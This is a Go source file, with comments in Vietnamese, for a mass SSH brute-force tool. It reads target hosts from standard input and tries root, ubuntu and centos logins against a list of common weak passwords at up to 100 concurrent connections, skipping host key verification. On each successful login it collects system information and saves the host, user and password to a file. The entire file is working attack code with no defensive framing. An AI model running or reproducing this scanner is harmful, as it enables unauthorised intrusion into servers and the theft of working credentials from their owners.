package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	maxConcurrentConnections = 100  // Giảm từ 500 xuống 100
	connectionTimeout        = 8 * time.Second  // Giảm timeout
	sshCommandTimeout        = 3 * time.Second  // Giảm command timeout
	outputFileName           = "data.txt"
	maxTargetsBuffer         = 50   // Giới hạn buffer targets
	processDelay            = 50 * time.Millisecond // Delay giữa các lần xử lý
)

var (
	// Bộ đếm thống kê
	totalAttempts    int64
	successfulLogins int64
	failedAttempts   int64

	// Thông tin đăng nhập được định sẵn
	users     = []string{"root", "ubuntu", "centos"}
	passwords = []string{
		"password", "123456789", "12345678", "1234567", "1234567890",
		"admin", "admin123", "admin@123", "root", "ubuntu", "centos",
		"test", "test123", "qwerty", "password123", "123123", "abc123",
	}

	// Đồng bộ hóa
	fileWriter    *SafeFileWriter
	connSemaphore = make(chan struct{}, maxConcurrentConnections)
)

// SafeFileWriter cung cấp các thao tác ghi file thread-safe
type SafeFileWriter struct {
	mu       sync.Mutex
	filename string
	file     *os.File
}

// NewSafeFileWriter tạo một instance SafeFileWriter mới
func NewSafeFileWriter(filename string) (*SafeFileWriter, error) {
	file, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		return nil, err
	}
	return &SafeFileWriter{
		filename: filename,
		file:     file,
	}, nil
}

// Write ghi dữ liệu vào file một cách an toàn
func (sfw *SafeFileWriter) Write(data string) error {
	sfw.mu.Lock()
	defer sfw.mu.Unlock()
	_, err := sfw.file.WriteString(data)
	if err == nil {
		sfw.file.Sync() // Ép buộc ghi vào đĩa
	}
	return err
}

// Close đóng file một cách an toàn
func (sfw *SafeFileWriter) Close() error {
	sfw.mu.Lock()
	defer sfw.mu.Unlock()
	return sfw.file.Close()
}

// LoginResult đại diện cho kết quả của một lần thử đăng nhập
type LoginResult struct {
	Host       string
	User       string
	Password   string
	Success    bool
	SystemInfo string
	Error      error
}

// SSHClient đại diện cho một SSH client được tối ưu
type SSHClient struct {
	timeout time.Duration
}

// NewSSHClient tạo một SSH client mới với cài đặt tối ưu
func NewSSHClient() *SSHClient {
	return &SSHClient{
		timeout: connectionTimeout,
	}
}

// TryLogin thử đăng nhập vào một host với thông tin đăng nhập đã cho
func (c *SSHClient) TryLogin(ctx context.Context, host, user, password string) *LoginResult {
	result := &LoginResult{
		Host:     host,
		User:     user,
		Password: password,
		Success:  false,
	}
	// Lấy semaphore để giới hạn kết nối đồng thời
	select {
	case connSemaphore <- struct{}{}:
		defer func() { <-connSemaphore }()
	case <-ctx.Done():
		result.Error = ctx.Err()
		return result
	}

	atomic.AddInt64(&totalAttempts, 1)

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         c.timeout,
	}

	conn, err := ssh.Dial("tcp", host, config)
	if err != nil {
		atomic.AddInt64(&failedAttempts, 1)
		result.Error = err
		return result
	}
	defer conn.Close()

	// Create session with timeout
	session, err := conn.NewSession()
	if err != nil {
		atomic.AddInt64(&failedAttempts, 1)
		result.Error = err
		return result
	}
	defer session.Close()

	// Set up command timeout
	done := make(chan bool, 1)
	var output []byte
	var cmdErr error

	go func() {
		output, cmdErr = session.CombinedOutput(`uname -a && echo "====" && cat /etc/os-release 2>/dev/null || echo "No OS info available"`)
		done <- true
	}()

	select {
	case <-done:
		if cmdErr != nil {
			atomic.AddInt64(&failedAttempts, 1)
			result.Error = cmdErr
			return result
		}
	case <-time.After(sshCommandTimeout):
		atomic.AddInt64(&failedAttempts, 1)
		result.Error = fmt.Errorf("command timeout")
		return result
	case <-ctx.Done():
		atomic.AddInt64(&failedAttempts, 1)
		result.Error = ctx.Err()
		return result
	}

	outputStr := strings.TrimSpace(string(output))
	parts := strings.Split(outputStr, "====")

	// Validate output - should have system info
	if len(parts) < 2 || len(strings.TrimSpace(parts[1])) == 0 {
		atomic.AddInt64(&failedAttempts, 1)
		result.Error = fmt.Errorf("invalid system information")
		return result
	}

	// Success case
	atomic.AddInt64(&successfulLogins, 1)
	result.Success = true
	result.SystemInfo = outputStr
	// Ghi log thành công
	fmt.Printf("[✔] Đăng nhập thành công: %s@%s:%s\n", user, host, password)
	fmt.Printf("→ Thông tin hệ thống:\n%s\n", outputStr)
	fmt.Println(strings.Repeat("-", 50))
	// Ghi dữ liệu vào file
	if fileWriter != nil {
		data := fmt.Sprintf("%s:%s:%s\n", host, user, password)
		if err := fileWriter.Write(data); err != nil {
			log.Printf("Lỗi ghi file: %v", err)
		}
	}

	return result
}

// Worker xử lý các target từ channel
func processTargets(ctx context.Context, targets <-chan string, results chan<- *LoginResult, wg *sync.WaitGroup) {
	defer wg.Done()

	client := NewSSHClient()

	for target := range targets {
		select {
		case <-ctx.Done():
			return
		default:
		}
		
		// Thêm delay nhỏ để tránh overwhelm
		time.Sleep(processDelay)
		
		// Thử tất cả các tổ hợp tài khoản cho target này
		for _, user := range users {
			for _, password := range passwords {
				select {
				case <-ctx.Done():
					return
				default:
				}
				
				result := client.TryLogin(ctx, target, user, password)

				select {
				case results <- result:
				case <-ctx.Done():
					return
				}

				if result.Success {
					goto nextTarget
				}
				
				// Delay nhỏ giữa các attempts
				time.Sleep(10 * time.Millisecond)
			}
		}
	nextTarget:
	}
}

// printStats in thống kê hiện tại
func printStats() {
	total := atomic.LoadInt64(&totalAttempts)
	success := atomic.LoadInt64(&successfulLogins)
	failed := atomic.LoadInt64(&failedAttempts)

	fmt.Printf("\n=== Thống kê ===\n")
	fmt.Printf("Tổng số lần thử: %d\n", total)
	fmt.Printf("Đăng nhập thành công: %d\n", success)
	fmt.Printf("Thất bại: %d\n", failed)
	if total > 0 {
		fmt.Printf("Tỷ lệ thành công: %.2f%%\n", float64(success)/float64(total)*100)
	}
	fmt.Println(strings.Repeat("=", 20))
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Cách sử dụng: ./ssh_scanner <port | listen>")
		fmt.Println("Ví dụ:")
		fmt.Println("  ./ssh_scanner 22")
		fmt.Println("  ./ssh_scanner listen")
		return
	}

	// Khởi tạo file writer
	var err error
	fileWriter, err = NewSafeFileWriter(outputFileName)
	if err != nil {
		log.Fatalf("Không thể tạo file writer: %v", err)
	}
	defer fileWriter.Close()

	// Tạo context để shutdown
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	// Tạo channels với buffer nhỏ hơn
	targets := make(chan string, maxTargetsBuffer)
	results := make(chan *LoginResult, 50)

	// Giảm số workers để tránh overwhelm
	const numWorkers = 5  // Giảm từ 10 xuống 5
	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go processTargets(ctx, targets, results, &wg)
	}

	// Khởi động result collector - chỉ xử lý kết quả, không log lỗi thường
	go func() {
		for result := range results {
			// Không log lỗi thường, chỉ log lỗi nghiêm trọng
			_ = result
		}
	}()
	// Khởi động statistics printer với interval lớn hơn
	statsTicker := time.NewTicker(60 * time.Second)  // Tăng từ 30s lên 60s
	defer statsTicker.Stop()
	go func() {
		for {
			select {
			case <-statsTicker.C:
				printStats()
			case <-ctx.Done():
				return
			}
		}
	}()

	fmt.Println("SSH Scanner đã khởi động. Đang đọc targets từ stdin...")
	fmt.Printf("Số kết nối đồng thời tối đa: %d\n", maxConcurrentConnections)
	fmt.Printf("Timeout kết nối: %v\n", connectionTimeout)
	fmt.Println(strings.Repeat("-", 50))	// Đọc targets từ stdin với rate limiting
	scanner := bufio.NewScanner(os.Stdin)
	targetCount := 0
	lastReportTime := time.Now()

readLoop:
	for scanner.Scan() {
		target := strings.TrimSpace(scanner.Text())
		if target == "" {
			continue
		}

		var fullTarget string
		if os.Args[1] == "listen" {
			fullTarget = target
		} else {
			fullTarget = target + ":" + os.Args[1]
		}

		select {
		case targets <- fullTarget:
			targetCount++
			// Báo cáo tiến độ mỗi 50 targets thay vì 100
			if targetCount%50 == 0 && time.Since(lastReportTime) > 5*time.Second {
				fmt.Printf("Đã xếp hàng %d targets...\n", targetCount)
				lastReportTime = time.Now()
			}
		case <-ctx.Done():
			break readLoop
		case <-time.After(100 * time.Millisecond):
			// Timeout nhỏ để tránh block quá lâu
			fmt.Printf("Buffer đầy, chờ xử lý... (đã xếp hàng: %d)\n", targetCount)
			time.Sleep(200 * time.Millisecond)
			continue readLoop
		}
		
		// Thêm delay nhỏ giữa việc đọc targets
		if targetCount%10 == 0 {
			time.Sleep(10 * time.Millisecond)
		}
	}

	if err := scanner.Err(); err != nil {
		log.Printf("Lỗi đọc input: %v", err)
	}

	fmt.Printf("Hoàn thành đọc %d targets. Đang xử lý...\n", targetCount)

	// Đóng targets channel và chờ workers hoàn thành
	close(targets)
	wg.Wait()
	close(results)

	// In thống kê cuối cùng
	printStats()
	fmt.Println("Quét hoàn tất!")
}
